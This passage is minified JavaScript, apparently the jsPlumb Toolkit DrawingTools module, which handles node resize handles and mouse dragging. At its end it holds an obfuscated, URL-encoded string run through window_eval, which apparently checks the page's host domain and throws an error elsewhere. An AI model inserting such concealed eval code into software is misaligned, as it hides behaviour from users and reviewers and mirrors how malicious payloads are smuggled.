                        "data-dir": "br",
                        "data-node-id": a.id
                    }), n[a.id] = [d, "false" !== e, "false" !== f]
                }
            }, x = function (a, d, e, f) {
                var k = {};
                return k[o] = b ? e : h - g, k[p] = c ? f : j - i, k[q] = b ? a : g, k[r] = c ? d : i, k
            }, y = {
                tl: function (a, b) {
                    var c = g + a, d = i + b, e = h - c, f = j - d;
                    return c >= h && (e = c - h, c = h), d >= j && (f = d - j, d = j), x(c, d, e, f)
                }, tr: function (a, b) {
                    var c = h - g + a, d = i + b, e = j - d, f = g;
                    return c <= 0 && (f = g + c, c *= -1), d >= j && (e = d - j, d = j), x(f, d, c, e)
                }, bl: function (a, b) {
                    var c = g + a, d = j - i + b, e = h - c, f = i;
                    return c >= h && (e = c - h, c = h), d <= 0 && (f += d, d *= -1), x(c, f, e, d)
                }, br: function (a, b) {
                    var c = h - g + a, d = j - i + b, e = g, f = i;
                    return c <= 0 && (e = g + c, c *= -1), d <= 0 && (f += d, d *= -1), x(e, f, c, d)
                }
            };
        l.bind("selectionCleared", function () {
            s()
        }), l.bind("select", function (a) {
            w(a.obj, k)
        }), l.bind("deselect", function (a) {
            v(a.obj, k)
        });
        var z = function (a) {
            var b = k.mapEventLocation(a), c = b.left - d.left, g = b.top - d.top, h = e(c, g, "");
            l.updateNode(f, h), k.setPosition(f, h[q], h[r], !0)
        }, A = function (a) {
            k.storePositionInModel(f.id), m.removeClass(document.body, "jtk-drag-select-defeat"), m.off(document, "mousemove", z), m.off(document, "mouseup", A), jsPlumbUtil.consume(a)
        };
        m.on(document, "mousedown", ".jtk-draw-handle", function (a) {
            var o = this.getAttribute("data-dir"), p = this.getAttribute("data-node-id");
            f = l.getNode(p), b = n[p][1], c = n[p][2], d = k.mapEventLocation(a);
            var q = k.getCoordinates(f);
            g = q.x, i = q.y, h = g + q.w, j = i + q.h, e = y[o], m.addClass(document.body, "jtk-drag-select-defeat"), m.on(document, "mousemove", z), m.on(document, "mouseup", A)
        })
    }, "undefined" != typeof exports && (exports.DrawingTools = a.jsPlumbToolkit.DrawingTools)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B"));
